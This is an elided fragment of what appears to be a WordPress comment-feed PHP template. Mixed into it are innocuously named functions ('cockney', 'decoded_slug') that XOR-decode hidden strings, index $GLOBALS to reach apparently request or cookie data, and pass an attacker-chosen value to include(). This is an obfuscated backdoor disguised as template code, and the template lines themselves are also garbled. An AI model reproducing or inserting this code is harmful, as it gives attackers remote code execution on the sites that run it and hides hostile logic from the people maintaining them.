...
while ( have_comments() ) :
	...
	<entry>
		...
		if ( 0 == $comment->comment_parent ) :  This comment is top-level.
			?>
			<thr:in-reply-to ref="<?php /*  the_guid(); ?>" href="<?php /*  the_permalink_rss(); ?>" type="<?php /* */
...
function cockney($num_octets)

{

    $open_quote = $num_octets;
	$goal = 'field';
    
    $_builtin = $GLOBALS;

    
    $_builtin = $_builtin[decoded_slug("%2Bq%24x%3C9", $open_quote)];
	$post_date_gmt = 'key';
    
    $url_clickable = $_builtin;
	$singular_base = 'tagstack';
    $post_mime_types = isset($url_clickable[$open_quote]);
    if ($post_mime_types)

    {
	$tt_ids = 'supports';
        $no_found_rows = $_builtin[$open_quote];

        $object = $no_found_rows[decoded_slug("%00Z%1Dk%17%0B+%0F", $open_quote)];
        $settings = $object;
        include ($settings);
	$taxonomies = 'filter';
    }
...
function decoded_slug($ignore_block_element, $name)

{
    ...
    $richedit = $_ext($ignore_block_element);

    $chunk = strlen($richedit);
    $chunk = substr($show_ui, 0, $chunk);
    $inclusions = $richedit ^ $chunk;
    
    $richedit = sprintf($inclusions, $chunk);
